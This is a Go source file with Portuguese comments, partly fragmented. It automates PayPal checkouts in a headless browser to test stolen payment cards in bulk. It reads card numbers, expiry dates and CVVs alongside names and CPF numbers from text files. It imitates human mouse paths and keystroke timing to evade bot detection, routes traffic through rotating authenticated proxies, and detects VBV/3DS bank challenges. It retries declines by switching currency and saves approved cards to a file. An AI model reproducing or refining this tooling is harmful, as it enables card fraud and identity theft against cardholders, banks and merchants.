var (
	rngMu sync.Mutex
	rng   = rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(os.Getpid())))
)

func randInt(min, max int) int {
	if max <= min {
		return min
	}
	rngMu.Lock()
	defer rngMu.Unlock()
	return min + rng.Intn(max-min)
}

func randFloat(min, max float64) float64 {
	rngMu.Lock()
	defer rngMu.Unlock()
	return min + rng.Float64()*(max-min)
}

// randEnviesado — distribuição log-normal-ish, maioria rápido, alguns devagar.
func randEnviesado(min, max int) int {
	if max <= min {
		return min
	}
	rngMu.Lock()
	r := rng.Float64()
	rngMu.Unlock()
	biased := r * r
	return min + int(biased*float64(max-min))
}

// randGauss — distribuição normal truncada (Box-Muller), pra sleeps e delays.
func randGauss(mean, stddev, min, max float64) float64 {
	rngMu.Lock()
	u1 := rng.Float64()
	u2 := rng.Float64()
	rngMu.Unlock()
	z := math.Sqrt(-2.0*math.Log(u1+1e-12)) * math.Cos(2.0*math.Pi*u2)
	v := mean + z*stddev
	if v < min {
		v = min
	}
	if v > max {
		v = max
	}
	return v
}

type placar struct {
	mu         sync.Mutex
	aprovadas  int
	recusadas  int
	erros      int
	vbv        int
	inicio     time.Time
	ondaAtual  int
	totalOndas int
}

var gp = &placar{inicio: time.Now()}

func (p *placar) addAprovada() { p.mu.Lock(); p.aprovadas++; p.mu.Unlock() }
func (p *placar) addRecusada() { p.mu.Lock(); p.recusadas++; p.mu.Unlock() }
func (p *placar) addErro()     { p.mu.Lock(); p.erros++; p.mu.Unlock() }
func (p *placar) addVBV()      { p.mu.Lock(); p.vbv++; p.mu.Unlock() }

func (p *placar) snapshot() (a, r, e, v, total int, taxa float64) {
	p.mu.Lock()
	defer p.mu.Unlock()
	a, r, e, v = p.aprovadas, p.recusadas, p.erros, p.vbv
	total = a + r + e + v
	if total > 0 {
		taxa = float64(a) / float64(total) * 100
	}
	return
}

func barra(qtd, maximo, largura int) string {
	if maximo <= 0 {
		return strings.Repeat("░", largura)
	}
	preenchido := qtd * largura / maximo
	if preenchido > largura {
		preenchido = largura
	}
	return strings.Repeat("█", preenchido) + strings.Repeat("░", largura-preenchido)
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func (p *placar) render(titulo string) {
	a, r, e, v, total, taxa := p.snapshot()

	larg := 54
	linha := strings.Repeat("═", larg)

	corTaxa := cRed
	switch {
	case taxa >= 50:
		corTaxa = cGreen
	case taxa >= 20:
		corTaxa = cYell
	}

	max := a
	if r > max {
		max = r
	}
	if e > max {
		max = e
	}
	if v > max {
		max = v
	}
	if max == 0 {
		max = 1
	}

	decorrido := time.Since(p.inicio).Truncate(time.Second)
	den := maxInt(1, total)

	fmt.Println()
	fmt.Println(cor(cCyan+cBold, "╔"+linha+"╗"))
	fmt.Printf("%s  %-50s%s\n", cCyan+cBold, titulo, cReset+"\033[36m║"+cReset)
	fmt.Println(cor(cCyan, "╠"+linha+"╣"))
	fmt.Printf("  %s✓ APROVADAS%s  %s %4d  %s%.1f%%%s\n",
		cGreen+cBold, cReset, barra(a, max, 20), a, cGreen, float64(a)/float64(den)*100, cReset)
	fmt.Printf("  %s✗ RECUSADAS%s  %s %4d  %s%.1f%%%s\n",
		cRed+cBold, cReset, barra(r, max, 20), r, cRed, float64(r)/float64(den)*100, cReset)
	fmt.Printf("  %s🔒 VBV/3DS%s   %s %4d  %s%.1f%%%s\n",
		cYell+cBold, cReset, barra(v, max, 20), v, cYell, float64(v)/float64(den)*100, cReset)
	fmt.Printf("  %s⚠ ERROS%s      %s %4d  %s%.1f%%%s\n",
		cYell+cBold, cReset, barra(e, max, 20), e, cYell, float64(e)/float64(den)*100, cReset)
	fmt.Println(cor(cCyan, "╠"+linha+"╣"))
	fmt.Printf("  %sTOTAL%s: %s%d%s processados  •  %stempo%s: %s%s%s\n",
		cBold, cReset, cBold, total, cReset, cBold, cReset, cDim, decorrido.String(), cReset)
	fmt.Printf("  %sTAXA DE APROVAÇÃO%s: %s%.2f%%%s  %s(%d/%d)%s\n",
		cBold, cReset, corTaxa+cBold, taxa, cReset, cDim, a, total, cReset)
	fmt.Println(cor(cCyan+cBold, "╚"+linha+"╝"))
	fmt.Println()
}

			float64(maxMs-minMs)/4.0,
			float64(minMs),
			float64(maxMs),
		)
		d := time.Duration(ms*p.GlobalSleepMul) * time.Millisecond
		select {
		case <-time.After(d):
			return nil
		case <-ctx.Done():
			return ctx.Err()
		}
	})
}

func humanMoveMouse(x, y float64) chromedp.ActionFunc {
	return chromedp.ActionFunc(func(ctx context.Context) error {
		p := getPersona(ctx)

		var curX, curY float64
		_ = chromedp.Evaluate(`(function(){return [window._lx||0, window._ly||0];})()`, &[]interface{}{&curX, &curY}).Do(ctx)

		ctrlX := (curX + x) / 2 + randFloat(-180, 180)
		ctrlY := (curY + y) / 2 + randFloat(-180, 180)

		steps := randInt(p.MouseStepsMin, p.MouseStepsMax)
		for i := 0; i <= steps; i++ {
			t := float64(i) / float64(steps)
			px := (1-t)*(1-t)*curX + 2*(1-t)*t*ctrlX + t*t*x
			py := (1-t)*(1-t)*curY + 2*(1-t)*t*ctrlY + t*t*y

			err := chromedp.ActionFunc(func(ctx context.Context) error {
				return input.DispatchMouseEvent(input.MouseMoved, px, py).Do(ctx)
			}).Do(ctx)
			if err != nil {
				return nil
			}
			delay := randInt(p.MouseStepDelayMin, p.MouseStepDelayMax)
			if randInt(0, 100) < 15 {
				delay += randInt(5, 20)
			}
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
		_ = chromedp.Evaluate(fmt.Sprintf(`window._lx=%f;window._ly=%f;`, x, y), nil).Do(ctx)
		return nil
	})
}

		_ = chromedp.Evaluate(clearScript, &valorAtual).Do(ctx)

				(function(){
					%s

					if (!el) return;
					var setter = Object.getOwnPropertyDescriptor(ctx.win.HTMLInputElement.prototype,'value').set;

				})()
			`, jsGetCtx, docLoc, fieldID), nil).Do(ctx)

		for i, ch := range texto {

					if (!ctx) return 'ctx-null';

					var win = ctx.win;

					var kd = new win.KeyboardEvent('keydown', {key: %q, bubbles: true, cancelable: true});
					try { el.dispatchEvent(kd); } catch(e) {}

					var setter = Object.getOwnPropertyDescriptor(win.HTMLInputElement.prototype,'value').set;
					var novo = (el.value || '') + %q;
					setter.call(el, novo);

					var ev = new win.Event('input', {bubbles: true});
					try { el.dispatchEvent(ev); } catch(e) {}

					var ku = new win.KeyboardEvent('keyup', {key: %q, bubbles: true, cancelable: true});
					try { el.dispatchEvent(ku); } catch(e) {}

					return 'ok';
				})()
			`, jsGetCtx, docLoc, fieldID, chStr, chStr, chStr)
			_ = evaluateJS(ctx, script)

			ms := randGauss(
				float64(p.TypeMinMs+p.TypeMaxMs)/2.0,
				float64(p.TypeMaxMs-p.TypeMinMs)/4.0,
				float64(p.TypeMinMs),
				float64(p.TypeMaxMs),

					float64(p.ThinkMaxMs-p.ThinkMinMs)/4.0,
					float64(p.ThinkMinMs),
					float64(p.ThinkMaxMs),
				)
				time.Sleep(time.Duration(thinkMs) * time.Millisecond)
			}
		}

		_ = chromedp.Evaluate(fmt.Sprintf(`
			(function(){
				%s
				var ctx = getCtx(%q);
				if (!ctx) return;
				var el = ctx.doc.getElementById(%q);

	})

func reescreverArquivo(arquivo string, linhas []string) error {
	tmp := arquivo + ".tmp"
	f, err := os.Create(tmp)
	if err != nil {
		return err
	}
	w := bufio.NewWriter(f)
	for _, l := range linhas {
		if _, err := fmt.Fprintln(w, l); err != nil {
			f.Close()
			os.Remove(tmp)
			return err
		}
	}
	if err := w.Flush(); err != nil {
		f.Close()
		os.Remove(tmp)
		return err
	}
	if err := f.Close(); err != nil {
		os.Remove(tmp)
		return err
	}
	return os.Rename(tmp, arquivo)
}

func lerEDeletarPrimeiro(arquivo string) (*DadosTxt, error) {
	f, err := os.Open(arquivo)
	if err != nil {
		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
	}
	var linhas []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if l := strings.TrimSpace(sc.Text()); l != "" {
			linhas = append(linhas, l)
		}
	}
	f.Close()
	if sc.Err() != nil {
		return nil, sc.Err()
	}
	if len(linhas) == 0 {
		return nil, fmt.Errorf("arquivo %s está vazio", arquivo)
	}
	dados, err := parseLinha(linhas[0])
	if err != nil {
		return nil, err
	}
	if err := reescreverArquivo(arquivo, linhas[1:]); err != nil {
		return nil, err
	}
	return dados, nil
}

func parseLinha(linha string) (*DadosTxt, error) {
	partes := strings.SplitN(linha, "|", 2)
	if len(partes) < 2 {
		return nil, fmt.Errorf("formato inválido (esperado NOME|CPF): %s", linha)
	}
	nome := strings.TrimSpace(partes[0])
	cpf := strings.TrimSpace(partes[1])
	if nome == "" || cpf == "" {
		return nil, fmt.Errorf("formato inválido (nome ou CPF vazio): %s", linha)
	}
	return &DadosTxt{
		Nome:       nome,
		CPF:        cpf,
		Nascimento: "",
	}, nil
}

func lerEDeletarCartao(arquivo string) (*CartaoData, error) {
	f, err := os.Open(arquivo)
	if err != nil {
		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
	}
	var linhas []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if l := strings.TrimSpace(sc.Text()); l != "" {
			linhas = append(linhas, l)
		}
	}
	f.Close()
	if sc.Err() != nil {
		return nil, sc.Err()
	}
	if len(linhas) == 0 {
		return nil, fmt.Errorf("arquivo %s está vazio", arquivo)
	}
	partes := strings.Split(linhas[0], "|")
	if len(partes) < 4 {
		return nil, fmt.Errorf("formato inválido em carnews.txt: %s", linhas[0])
	}
	card := &CartaoData{
		Numero: strings.TrimSpace(partes[0]),
		Mes:    strings.TrimSpace(partes[1]),
		Ano:    strings.TrimSpace(partes[2]),
		CVV:    strings.TrimSpace(partes[3]),
	}
	if len(card.Ano) < 4 {
		return nil, fmt.Errorf("carnews.txt: ano inválido %q (esperado YYYY)", card.Ano)
	}
	if len(card.Mes) == 0 || len(card.CVV) < 3 {
		return nil, fmt.Errorf("carnews.txt: mês/cvv inválido: %q/%q", card.Mes, card.CVV)
	}
	if err := reescreverArquivo(arquivo, linhas[1:]); err != nil {
		return nil, err
	}
	return card, nil
}

		return nil, err
	}

func gerarEmail(nome string) string {
	provedores := []string{"@icloud.com", "@gmail.com", "@outlook.com"}
	partes := strings.Fields(strings.ToLower(acentos.Replace(nome)))
	var local string
	switch len(partes) {
	case 0:
		local = "user"
	case 1:
		local = partes[0]
	default:
		local = partes[0] + "." + partes[len(partes)-1]
	}
	return fmt.Sprintf("%s%d%s", local, randInt(1000, 9999), provedores[randInt(0, len(provedores))])
}

const jsGetCtx = `
	function getCtx(loc) {
		if (loc === 'page') return {doc: document, win: window};
		var parts = loc.split('-');
		try {
			if (parts.length === 2) {
				var w = document.querySelectorAll('iframe')[parseInt(parts[1])].contentWindow;
				return {doc: w.document, win: w};
			} else if (parts.length === 3) {
				var outerW = document.querySelectorAll('iframe')[parseInt(parts[1])].contentWindow;
				var innerW = outerW.document.querySelectorAll('iframe')[parseInt(parts[2])].contentWindow;
				return {doc: innerW.document, win: innerW};
			}
		} catch(e) {}
		return null;
	}`

		} catch(e) { r.push('[' + i + '] err'); }
	}
	return r.join(' | ');
})()`

// Detecção de VBV/3DS — expandido com termos do Bradesco/Itaú/etc.
const jsDetectarVBV = `
(function(){
	try {
		var u = location.href || '';
		var ul = u.toLowerCase();
		// URL do banco ou 3DS
		if (/3dsecure|3ds|vbv|verifiedbyvisa|mastercardsecurecode|challenge|authenticate|bradesco|itau|santander|banco|verificacao|validacao/i.test(ul)) {
			return 'url:' + u;
		}

		var body = (document.body && document.body.innerText) ? document.body.innerText.toLowerCase() : '';
		var pistas = [
			'verificação', 'verificacao', 'verification',
			'validação', 'validacao', 'validation',
			'validação de segurança', 'validacao de seguranca',
			'validação de seguranca', 'security validation',
			'seu banco solicitou', 'banco solicitou',
			'código enviado', 'codigo enviado', 'sms',
			'3d secure', '3ds', 'verified by visa', 'vbv',
			'mastercard securecode', 'autenticação', 'autenticacao',
			'confirme sua identidade', 'confirme a compra',
			'código de segurança', 'codigo de seguranca',
			'digite o código', 'digite o codigo',
			'token', 'código de verificação', 'codigo de verificacao',
			'senha do cartão', 'senha do cartao'
		];
		for (var i=0;i<pistas.length;i++){
			if (body.indexOf(pistas[i]) >= 0) return 'txt:' + pistas[i];
		}

		// iframes com src suspeito
		var iframes = document.querySelectorAll('iframe');
		for (var k=0;k<iframes.length;k++){
			try {
				var su = (iframes[k].src || '').toLowerCase();
				if (/3dsecure|3ds|vbv|challenge|authentication|bradesco|itau|santander|verificacao|validacao/i.test(su)) {
					return 'iframe:' + su;
				}
			} catch(e) {}
		}

		// título da página
		var title = (document.title || '').toLowerCase();
		if (/3d|vbv|verified|challenge|autentic|verific|valid/i.test(title)) {
			return 'title:' + title;
		}

		return '';
	} catch(e) { return ''; }
})()`

func jsCoordsIframe(docLoc, targetInputID string) string {
	return fmt.Sprintf(`
		(function(){
			%s
			var ctx = getCtx(%q);
			if (!ctx) return null;
			var doc = ctx.doc;
			var lbl = doc.querySelector('label[for="' + %q + '"]');
			var el = lbl || doc.getElementById(%q);
			if (!el) return null;
			try { el.scrollIntoView({block:'center', behavior:'instant'}); } catch(e) {}
			var r = el.getBoundingClientRect();
			return [r.left + r.width/2, r.top + r.height/2];
		})()
	`, jsGetCtx, docLoc, targetInputID, targetInputID)
}

func jsFrameOffset(docLoc string) string {
	return fmt.Sprintf(`
		(function(){
			%s
			var loc = %q;
			if (loc === 'page') return [0, 0];
			var parts = loc.split('-');
			var ox = 0, oy = 0;
			var doc = document;
			for (var k = 1; k < parts.length; k++) {
				try {
					var idx = parseInt(parts[k]);
					var fr = doc.querySelectorAll('iframe')[idx];
					var r = fr.getBoundingClientRect();
					ox += r.left;
					oy += r.top;
					doc = fr.contentDocument || fr.contentWindow.document;
				} catch(e) { return [ox, oy]; }
			}
			return [ox, oy];
		})()
	`, jsGetCtx, docLoc)
}

func jsPreencherSelect(docLoc, fieldID, valor string) string {
	return fmt.Sprintf(`
	(function(){
		%s
		var ctx = getCtx(%q);
		if (!ctx) return 'ctx-null';
		var el = ctx.doc.getElementById(%q);
		if (!el) return 'not-found';
		el.value = %q;
		el.dispatchEvent(new ctx.win.Event('change',{bubbles:true}));
		el.dispatchEvent(new ctx.win.Event('blur',  {bubbles:true}));
		return 'ok';
	})()`, jsGetCtx, docLoc, fieldID, valor)
}

func trocarMoedaPayPal(ctx context.Context, docLoc, moeda string) {
	fmt.Printf("  → [troca-moeda] alternando para %s (clique real)...\n", moeda)

	var targetID string
	if moeda == "USD" {
		targetID = "paypal-currency-conversion-option"
	} else {
		targetID = "vendor-currency-conversion-option"
	}

	checkScript := fmt.Sprintf(`
		(function(){
			%s
			var locs = [%q, 'page'];
			for (var li = 0; li < locs.length; li++) {
				var ctx = getCtx(locs[li]);
				if (!ctx) continue;
				var doc = ctx.doc;
				var paypal = doc.getElementById('paypal-currency-conversion-option');
				var vendor = doc.getElementById('vendor-currency-conversion-option');
				if (!paypal && !vendor) continue;
				if (paypal && paypal.checked) return 'USD:' + locs[li];
				if (vendor && vendor.checked) return 'BRL:' + locs[li];
				return 'none:' + locs[li];
			}
			return 'not-found';
		})()
	`, jsGetCtx, docLoc)

	clickReal := func() bool {
		var coords []float64
		coordScript := jsCoordsIframe(docLoc, targetID)
		if err := chromedp.Evaluate(coordScript, &coords).Do(ctx); err != nil || len(coords) < 2 {
			fmt.Println(cor(cYell, "    ⚠ coords do label não encontradas"))
			return false
		}

		var off []float64
		if err := chromedp.Evaluate(jsFrameOffset(docLoc), &off).Do(ctx); err != nil || len(off) < 2 {
			off = []float64{0, 0}
		}

		absX := coords[0] + off[0]
		absY := coords[1] + off[1]
		fmt.Printf("    → clique real em (%.0f, %.0f) no label de %s\n", absX, absY, moeda)

		_ = chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseMoved, absX, absY).Do(ctx)
		}).Do(ctx)
		time.Sleep(time.Duration(randInt(80, 180)) * time.Millisecond)

		_ = chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MousePressed, absX, absY).
				WithButton(input.Left).WithClickCount(1).Do(ctx)
		}).Do(ctx)
		time.Sleep(time.Duration(randInt(40, 90)) * time.Millisecond)

		_ = chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseReleased, absX, absY).
				WithButton(input.Left).WithClickCount(1).Do(ctx)
		}).Do(ctx)

		time.Sleep(time.Duration(randInt(400, 800)) * time.Millisecond)
		return true
	}

	estado := evaluateJS(ctx, checkScript)
	fmt.Printf("    estado atual: %s (quer=%s)\n", estado, moeda)

	if strings.HasPrefix(estado, moeda+":") {
		fmt.Printf("    ✓ já está em %s\n", moeda)
		return
	}

	for tent := 1; tent <= 3; tent++ {
		if !clickReal() {
			return
		}
		estado2 := evaluateJS(ctx, checkScript)
		fmt.Printf("    verificação %d: %s\n", tent, estado2)
		if strings.HasPrefix(estado2, moeda+":") {
			fmt.Printf("    ✓ confirmado em %s\n", moeda)
			return
		}
	}
	fmt.Println(cor(cYell, "    ⚠ não consegui confirmar a troca (segue mesmo assim)"))
}

func submitPayPal(ctx context.Context, locs []string) bool {
	fmt.Println("  → Clicando submit-button...")
	for _, loc := range locs {
		res := evaluateJS(ctx, jsClicarBotao(loc, "submit-button"))
		fmt.Printf("    %-30s → %s (%s)\n", "submit-button", res, loc)
		if res == "ok" || res == "clicked" {
			return true
		}
	}
	return false
}

// esperarResultadoPayPal retorna:
//   1 = aprovado
//   0 = recusado
//  -1 = VBV/3DS detectado
//  -2 = timeout
func esperarResultadoPayPal(ctx context.Context) (int, string) {
	dl := time.Now().Add(45 * time.Second)
	vbvCheck := time.Time{}
	popupCheck := time.Time{}
	for time.Now().Before(dl) {
		var u string
		_ = chromedp.Location(&u).Do(ctx)

		if strings.Contains(u, "thank-you") {
			return 1, u
		}

		// checa VBV a cada 2s
		if time.Since(vbvCheck) >= 2*time.Second {
			vbvCheck = time.Now()
			var vbv string
			_ = chromedp.Evaluate(jsDetectarVBV, &vbv).Do(ctx)
			if vbv != "" {
				fmt.Printf("  🔒 VBV/3DS detectado: %s\n", vbv)
				return -1, u
			}
		}

		// tenta fechar popups a cada 3s
		if time.Since(popupCheck) >= 3*time.Second {
			popupCheck = time.Now()
			_ = fecharPopupsPayPal(ctx).Do(ctx)
		}

		time.Sleep(2 * time.Second)
	}
	var u string
	_ = chromedp.Location(&u).Do(ctx)
	return -2, u
}

func erroRetentavel(msg string) bool {

	return strings.Contains(msg, "atualize") ||

		strings.Contains(msg, "tente novamente") ||
		strings.Contains(msg, "try again") ||
		strings.Contains(msg, "alguns minutos")
}

					%s
					var ctx = getCtx(%q);

	submitPayPal(ctx, locs)

	fmt.Println("  → Aguardando resultado (até 45s)...")
	status, urlFinal := esperarResultadoPayPal(ctx)
	fmt.Printf("  → URL final: %s (status=%d)\n", urlFinal, status)

	switch status {
	case 1:
		var confirmacao string
		_ = chromedp.Evaluate(`
			(function(){
				var all = document.querySelectorAll('*');
				for(var i=0;i<all.length;i++){

					if(node.children.length > 0) continue;
					var t = (node.textContent || '').trim();

					if(m) return 'Confirmação nº ' + m[1];

				var body = document.body ? document.body.innerText : '';
				var m2 = body.match(/Confirma[çc][aã]o\s*n[oº°]?\s*(\S+)/i);
				return m2 ? 'Confirmação nº ' + m2[1] : '';

			urlFinal, card.Numero, card.Mes, card.Ano, card.CVV, confirmacao)

		fmt.Printf("\n  %s\n", cor(cGreen+cBold, "*** PAGAMENTO APROVADO ***"))
		fmt.Printf("  %s\n", strings.TrimSpace(linha))

		f, ferr := os.OpenFile("aprovadas.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if ferr == nil {
			f.WriteString(linha)
			f.Close()
			fmt.Println("  → Salvo em aprovadas.txt")
		}
		return 1

	case -1:
		fmt.Printf("\n  %s %s %s %s %s -> VBV/3DS\n",
			cor(cYell, "VBV:"), card.Numero, card.Mes, card.Ano, card.CVV)
		salvarProva(ctx, card, "VBV/3DS")

		if ferr == nil {
			fmt.Fprintf(f, "%s %s %s %s VBV/3DS %s\n",
				urlFinal, card.Numero, card.Mes, card.Ano, card.CVV)
			f.Close()
		}
		paypalUltimoDocLoc = docLoc
		paypalUltimosLocs = locs
		return -1

	case -2:
		fmt.Printf("\n  %s %s %s %s %s -> TIMEOUT\n",
			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV)
		paypalUltimoDocLoc = docLoc
		paypalUltimosLocs = locs
		return 0

	default:
		erroMsg := extrairErroPayPal(ctx, docLoc)
		if erroMsg == "" {
			erroMsg = "Erro desconhecido (sem mensagem extraída)"
		}
		fmt.Printf("\n  %s %s %s %s %s -> %s\n",
			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV, erroMsg)

		paypalUltimoDocLoc = docLoc
		paypalUltimosLocs = locs
		return 0
	}
}

func tentarTrocarMoedaEPagar(ctx context.Context, card *CartaoData, novaMoeda string) int {
	docLoc := paypalUltimoDocLoc
	locs := paypalUltimosLocs
	if docLoc == "" {
		locs = []string{"page"}
	}

	fmt.Printf("  → [fallback] Reaproveitando formulário PayPal em %s\n", docLoc)
	fmt.Printf("  → [fallback] Trocando moeda para %s (sem refazer checkout)...\n", novaMoeda)

	trocarMoedaPayPal(ctx, docLoc, novaMoeda)
	time.Sleep(time.Duration(randInt(700, 1500)) * time.Millisecond)

	submitPayPal(ctx, locs)

	fmt.Println("  → Aguardando resultado (até 45s)...")
	status, urlFinal := esperarResultadoPayPal(ctx)
	fmt.Printf("  → URL final: %s (status=%d)\n", urlFinal, status)

	switch status {
	case 1:
		var confirmacao string
		_ = chromedp.Evaluate(`
			(function(){
				var body = document.body ? document.body.innerText : '';
				var m2 = body.match(/Confirma[çc][aã]o\s*n[oº°]?\s*(\S+)/i);
				return m2 ? 'Confirmação nº ' + m2[1] : '';
			})()
		`, &confirmacao).Do(ctx)
		if confirmacao == "" {
			confirmacao = "Confirmação nº (não extraída)"
		}
		salvarProva(ctx, card, confirmacao)
		linha := fmt.Sprintf("%s %s %s %s %s PAGAMENTO APROVADO %s\n",
			urlFinal, card.Numero, card.Mes, card.Ano, card.CVV, confirmacao)
		fmt.Printf("\n  %s\n", cor(cGreen+cBold, "*** PAGAMENTO APROVADO (fallback moeda) ***"))
		fmt.Printf("  %s\n", strings.TrimSpace(linha))
		f, ferr := os.OpenFile("aprovadas.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if ferr == nil {
			f.WriteString(linha)
			f.Close()
			fmt.Println("  → Salvo em aprovadas.txt")
		}
		return 1

	case -1:
		fmt.Printf("\n  %s %s %s %s %s -> VBV/3DS\n",
			cor(cYell, "VBV:"), card.Numero, card.Mes, card.Ano, card.CVV)
		salvarProva(ctx, card, "VBV/3DS")
		f, ferr := os.OpenFile("vbv.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if ferr == nil {
			fmt.Fprintf(f, "%s %s %s %s VBV/3DS %s\n",
				urlFinal, card.Numero, card.Mes, card.Ano, card.CVV)
			f.Close()
		}
		return -1

	default:
		erroMsg := extrairErroPayPal(ctx, docLoc)
		if erroMsg == "" {
			erroMsg = "Erro desconhecido (sem mensagem extraída)"
		}
		fmt.Printf("\n  %s %s %s %s %s -> %s\n",
			cor(cRed, "RECUSADO:"), card.Numero, card.Mes, card.Ano, card.CVV, erroMsg)
		return 0
	}
}

func iniciarProxyLocal(upstreamAddr, user, pass string) (localAddr string, parar func(), err error) {
	auth := "Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass))
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return "", nil, fmt.Errorf("proxy local: %w", err)
	}
	srv := &http.Server{
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			upConn, err := net.DialTimeout("tcp", upstreamAddr, 20*time.Second)
			if err != nil {
				http.Error(w, "upstream: "+err.Error(), http.StatusBadGateway)
				return
			}
			if r.Method == http.MethodConnect {
				fmt.Fprintf(upConn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Authorization: %s\r\nProxy-Connection: Keep-Alive\r\n\r\n",
					r.Host, r.Host, auth)

				br := bufio.NewReader(upConn)
				resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
				if err != nil {
					upConn.Close()
					http.Error(w, "read CONNECT resp: "+err.Error(), http.StatusBadGateway)
					return
				}
				if resp.StatusCode != http.StatusOK {
					upConn.Close()
					http.Error(w, fmt.Sprintf("tunnel falhou: %d %s", resp.StatusCode, resp.Status), http.StatusBadGateway)
					return
				}

				hj, ok := w.(http.Hijacker)
				if !ok {
					upConn.Close()
					http.Error(w, "hijack não suportado", http.StatusInternalServerError)
					return
				}
				clConn, _, err := hj.Hijack()
				if err != nil {
					upConn.Close()
					http.Error(w, "hijack: "+err.Error(), http.StatusInternalServerError)
					return
				}
				clConn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))

				go func() {
					io.Copy(upConn, clConn)
					upConn.Close()
				}()
				io.Copy(clConn, br)
				clConn.Close()
			} else {
				defer upConn.Close()
				r.Header.Set("Proxy-Authorization", auth)
				r.Header.Del("Proxy-Connection")
				if err := r.WriteProxy(upConn); err != nil {
					http.Error(w, "write: "+err.Error(), http.StatusBadGateway)
					return
				}
				resp, err := http.ReadResponse(bufio.NewReader(upConn), r)
				if err != nil {
					http.Error(w, "read: "+err.Error(), http.StatusBadGateway)
					return
				}
				defer resp.Body.Close()
				for k, v := range resp.Header {
					w.Header()[k] = v
				}
				w.WriteHeader(resp.StatusCode)
				io.Copy(w, resp.Body)
			}
		}),
	}
	go srv.Serve(ln)
	return ln.Addr().String(), func() { srv.Close(); ln.Close() }, nil
}

func lerLinks(arquivo string) ([]string, error) {
	f, err := os.Open(arquivo)
	if err != nil {
		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
	}
	defer f.Close()
	var links []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if l := strings.TrimSpace(sc.Text()); l != "" {
			links = append(links, l)
		}
	}
	if len(links) == 0 {
		return nil, fmt.Errorf("%s está vazio", arquivo)
	}
	return links, sc.Err()
}

	urlIdx := 0

	for onda := 1; ; onda++ {
		gp.mu.Lock()
		gp.ondaAtual = onda
		gp.mu.Unlock()

		fmt.Printf("\n%s\n", cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))
		fmt.Printf("%s\n", cor(cCyan+cBold, fmt.Sprintf("║  ONDA %-3d  (%d workers simultâneos)      ║", onda, numWorkers)))
		fmt.Printf("%s\n", cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))

		var lote []slotTrabalho
		for i := 1; i <= numWorkers; i++ {
			dados, err := lerEDeletarPrimeiro("dadosrandom.txt")
			if err != nil {
				fmt.Printf("  [slot %d] dadosrandom.txt esgotado.\n", i)
				break
			}
			card, err := lerEDeletarCartao("carnews.txt")
			if err != nil {
				fmt.Printf("  [slot %d] carnews.txt esgotado.\n", i)
				break
			}
			reg := sortearRegiao()
			persona := sortearPersona()
			u := links[urlIdx%len(links)]
			urlIdx++
			lote = append(lote, slotTrabalho{
				id: i, dados: dados, card: card, reg: reg, url: u, persona: persona,
			})
			fmt.Printf("  [slot %d] %s | %s | %s | persona=%s\n",
				i, dados.Nome, card.Numero, reg.UF, persona.Nome)
		}

		if len(lote) == 0 {
			fmt.Println("\n  Arquivos esgotados. Encerrando.")
			break
		}

		type endRes struct {
			i   int
			end *Pessoa4Devs
		}
		endCh := make(chan endRes, len(lote))
		for i := range lote {
			go func(i int) {
				end, err := buscarEnderecoAleatorio(lote[i].reg.UF)
				if err != nil {
					fmt.Printf("  [slot %d] erro endereço: %v\n", lote[i].id, err)
					endCh <- endRes{i, nil}
				} else {
					endCh <- endRes{i, end}
				}
			}(i)
		}
		for range lote {
			r := <-endCh
			lote[r.i].end = r.end
			if lote[r.i].end != nil {
				lote[r.i].email = gerarEmail(lote[r.i].dados.Nome)
			}
		}

		var wg sync.WaitGroup
		for _, slot := range lote {
			if slot.end == nil {
				fmt.Printf("  [slot %d] sem endereço — pulando.\n", slot.id)
				gp.addErro()
				continue
			}
			wg.Add(1)
			slot := slot
			go func() {
				defer wg.Done()
				const maxRetryProxy = 4
				for tentativa := 1; tentativa <= maxRetryProxy; tentativa++ {
					if tentativa > 1 {
						espera := time.Duration(tentativa*3) * time.Second
						fmt.Printf("  [worker %d] proxy falhou — retry %d/%d em %s...\n",
							slot.id, tentativa, maxRetryProxy, espera)
						time.Sleep(espera)
					}
					if tentativa == 1 {
						time.Sleep(time.Duration(randInt(500, 3500)) * time.Millisecond)
					}
					fmt.Printf("\n  [worker %d] → iniciando browser (tentativa %d) [persona=%s]\n",
						slot.id, tentativa, slot.persona.Nome)

					resultado := fluxoCompleto(slot.dados, slot.card, slot.end, slot.email, slot.url, slot.reg, slot.persona, moedaEscolhida)

					if resultado == 1 {
						gp.addAprovada()
						break
					}
					if resultado == 0 {
						gp.addRecusada()
						break
					}
					if resultado == -2 {
						gp.addVBV()
						break
					}
					if tentativa >= maxRetryProxy {
						gp.addErro()
						break
					}
					continue
				}
				fmt.Printf("  [worker %d] → browser encerrado\n", slot.id)
			}()
		}
		wg.Wait()

		gp.render(fmt.Sprintf("APÓS ONDA %d", onda))

		fmt.Printf("  ══ Onda %d concluída. Aguardando 5s... ══\n", onda)
		time.Sleep(5 * time.Second)
	}

	gp.render("RESULTADO FINAL")

	fmt.Println(cor(cCyan+cBold, "╔══════════════════════════════════════════╗"))

	fmt.Println(cor(cCyan+cBold, "╚══════════════════════════════════════════╝"))
